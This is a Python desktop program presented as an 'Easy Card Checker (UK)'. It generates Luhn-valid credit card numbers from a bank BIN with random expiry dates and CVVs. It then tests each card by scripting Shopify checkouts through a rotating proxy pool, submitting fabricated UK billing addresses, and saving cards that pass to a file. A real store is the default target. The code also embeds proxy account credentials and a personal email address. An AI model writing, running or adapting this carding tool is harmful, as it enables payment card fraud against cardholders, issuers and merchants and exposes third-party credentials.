import random
import requests
import tkinter as tk
from tkinter import scrolledtext, messagebox
import json
import re
from parse import parse
import threading
import queue
import time

# Proxy pool (expand in real use)
PROXY_POOL = [
    "http://uNv39mYeEjkoxByt:iLUULo9khnGB9KqI@geo.iproyal.com:12321",
    "http://uNv39mYeEjkoxByt:iLUULo9khnGB9KqI@geo.iproyal.com:12322",
]

# Card Generation
def generate_card_number(bin_number, length=16):
    prefix = str(bin_number)
    remaining_length = length - len(prefix) - 1
    random_digits = ''.join(random.choice('0123456789') for _ in range(remaining_length))
    card_number = prefix + random_digits
    check_digit = calculate_luhn_checksum(card_number)
    return card_number + str(check_digit)

def calculate_luhn_checksum(card_number):
    digits = [int(digit) for digit in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for digit in even_digits:
        total += sum(divmod(digit * 2, 10))
    return (10 - (total % 10)) % 10

def is_luhn_valid(card_number):
    return calculate_luhn_checksum(card_number[:-1]) == int(card_number[-1])

def generate_expiration_date():
    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(2025, 2030))
    return f"{month}/{year}"

def generate_cvv():
    return str(random.randint(100, 999))

# Shopify Checkout Logic
def process_card(card_details, shopify_url, result_queue):
    CNUBR, MONTH, YEAR, CVV = card_details.split('|')
    proxy_url = random.choice(PROXY_POOL)
    proxies = {"http": proxy_url, "https": proxy_url}
    sessions = requests.Session()

    # Cart request
    url = f"{shopify_url}/cart/34330523467916:1?traffic_source=buy_now"
    try:
        response = sessions.get(url, proxies=proxies, allow_redirects=True, timeout=10)
        if response.status_code != 200:
            result_queue.put(f"FAILED: {card_details} - Connection Issue")
            return
    except requests.RequestException:
        result_queue.put(f"FAILED: {card_details} - Network Error")
        return

    final_url = response.url
    template = "{shopify_url}/{shop_id}/checkouts/{location}?traffic_source=buy_now"
    result = parse(template, final_url)
    if not result:
        result_queue.put(f"FAILED: {card_details} - URL Error")
        return
    shop_id, location = result['shop_id'], result['location']

    # Authenticity token
    first = sessions.get(final_url, proxies=proxies, allow_redirects=True)
    pattern = r'<form data-customer-information-form="true" .*? name="authenticity_token" value="(?P<token>[^"]+)"'
    match = re.search(pattern, first.text)
    if not match:
        result_queue.put(f"FAILED: {card_details} - Token Error")
        return
    authenticity_token = match.group('token')

    # Atlas API (UK)
    atlas1 = "https://atlas.shopifysvc.com/graphql"
    uk_cities = ["London", "Manchester", "Birmingham", "Leeds", "Glasgow"]
    query_city = random.choice(uk_cities)
    json_payload = {
        "query": "query prediction($query: String, $sessionToken: String!, $countryCode: String, $locale: String) { prediction(query: $query, sessionToken: $sessionToken, countryCode: $countryCode, locale: $locale) { addressId city countryCode provinceCode zip latitude longitude }}",
        "variables": {
            "location": {"latitude": 51.5074, "longitude": -0.1278},
            "query": f"{random.randint(1, 999)} {query_city}",
            "sessionToken": "f20d60536117c14d5b830fc021ffc083-1686770213328",
            "countryCode": "GB",
            "locale": "EN-GB"
        }
    }
    headers = {"Content-Type": "application/json"}
    response = sessions.post(atlas1, data=json.dumps(json_payload), headers=headers, proxies=proxies)
    json_response = response.json()
    try:
        prediction = json_response["data"]["prediction"][0]
        address1 = f"{random.randint(1, 999)} {query_city} Road"
        city = prediction["city"]
        zip_code = prediction["zip"]
        province_code = prediction["provinceCode"]
    except (KeyError, IndexError, TypeError):
        result_queue.put(f"FAILED: {card_details} - Address Error")
        return

    # Checkout payload with hardcoded email
    payload3 = {
        "_method": "patch",
        "authenticity_token": authenticity_token,
        "checkout[email]": "anshu91119@gmail.com",  # Your email as requested
        "checkout[billing_address][address1]": address1.replace(" ", "+"),
        "checkout[billing_address][city]": city,
        "checkout[billing_address][province]": province_code,
        "checkout[billing_address][zip]": zip_code,
        "checkout[billing_address][country]": "GB",
        "checkout[billing_address][phone]": f"0786{random.randint(1000000, 9999999)}",
        "checkout[credit_card][number]": CNUBR,
        "checkout[credit_card][expiration]": f"{MONTH}/{YEAR}",
        "checkout[credit_card][cvv]": CVV,
    }
    new_url = f"{shopify_url}/{shop_id}/checkouts/{location}"
    response3 = sessions.post(new_url, data=payload3, proxies=proxies, allow_redirects=True)
    if response3.status_code == 200 and ("success" in response3.text.lower() or "approved" in response3.text.lower()):
        result_queue.put(f"VALID: {card_details}")
    else:
        result_queue.put(f"FAILED: {card_details}")

# GUI Logic
def generate_and_check_cards():
    bin_input = bin_entry.get().strip()
    num_cards = int(num_cards_entry.get().strip())
    shopify_url = website_entry.get().strip().rstrip('/')
    status_label.config(text="Generating...")
    card_queue = queue.Queue()
    result_queue = queue.Queue()
    valid_cards = []
    valid_count = 0

    # Generate cards
    for _ in range(num_cards):
        card_number = generate_card_number(bin_input)
        exp_date = generate_expiration_date()
        cvv = generate_cvv()
        if is_luhn_valid(card_number):
            card_details = f"{card_number}|{exp_date.split('/')[0]}|{exp_date.split('/')[1]}|{cvv}"
            card_queue.put(card_details)
        else:
            result_text.insert(tk.END, f"INVALID (Luhn): {card_number}\n")

    # Start threads
    threads = []
    for _ in range(min(5, num_cards)):
        if not card_queue.empty():
            thread = threading.Thread(target=process_card, args=(card_queue.get(), shopify_url, result_queue))
            thread.start()
            threads.append(thread)

    # Collect results
    for thread in threads:
        thread.join()
    while not result_queue.empty():
        result = result_queue.get()
        result_text.insert(tk.END, f"{result}\n")
        if "VALID" in result:
            valid_cards.append(result.split(": ")[1])
            valid_count += 1

    with open("valid_cards.txt", "w") as f:
        for card in valid_cards:
            f.write(card + "\n")
    status_label.config(text=f"Done! Found {valid_count} valid cards.")
    messagebox.showinfo("Complete", f"Process finished. {valid_count} valid cards saved to valid_cards.txt")

# GUI Setup
window = tk.Tk()
window.title("Easy Card Checker (UK)")
window.geometry("400x500")

tk.Label(window, text="Enter UK BIN (e.g., 465901):").pack(pady=5)
bin_entry = tk.Entry(window)
bin_entry.insert(0, "465901")  # Default UK BIN
bin_entry.pack()

tk.Label(window, text="Number of Cards to Check:").pack(pady=5)
num_cards_entry = tk.Entry(window)
num_cards_entry.insert(0, "5")  # Default
num_cards_entry.pack()

tk.Label(window, text="Shopify Store URL (e.g., https://evolvetogether.com):").pack(pady=5)
website_entry = tk.Entry(window)
website_entry.insert(0, "https://evolvetogether.com")  # Default
website_entry.pack()

generate_button = tk.Button(window, text="Start Checking", command=generate_and_check_cards, bg="green", fg="white")
generate_button.pack(pady=10)

status_label = tk.Label(window, text="Ready")
status_label.pack()

result_text = scrolledtext.ScrolledText(window, height=15)
result_text.pack(pady=10)

window.mainloop()
